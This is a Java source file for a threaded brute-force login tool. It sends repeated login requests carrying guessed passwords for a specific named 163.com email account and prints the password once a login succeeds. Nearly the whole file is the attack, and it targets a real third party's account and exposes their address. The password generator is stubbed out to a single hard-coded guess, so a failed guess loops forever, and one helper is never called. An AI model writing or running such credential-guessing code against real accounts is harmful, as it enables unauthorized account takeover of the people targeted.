package main;

/**
 * Created by I322233 on 1/4/2016.
 */
public class Run implements Runnable {
    private int num;
    public Run(int num){
        this.num = num;
    }
    public void run() {
        String password = generatePassword(num);
        while(password != null){
//            System.out.println("test password:"+password);
            String param = "syscheckcode=f4f304e2e173b54832c48477d1f3e99c9ae4e08e&username=15950570277@163.com&password="+password+"&product=other";
            if(HttpRequest.login(Main.url,param)){
                System.out.println("get password:"+password);
                break;
            }
            password = generatePassword(num);
        }

    }
    private String generatePassword(int num){
        String password = "";
//        for(int i=0;i<num;i++){
//            password+=Main.getRanChar();
//        }
        password = "gdr@1993";
        return password;
    }
    private synchronized String getPassword(){
        if(Main.passwords.size() > 0){
            return Main.passwords.remove(0);
        }else{
            return null;
        }
    }
    private synchronized void clearPasswords(){
        Main.passwords.clear();
    }
}
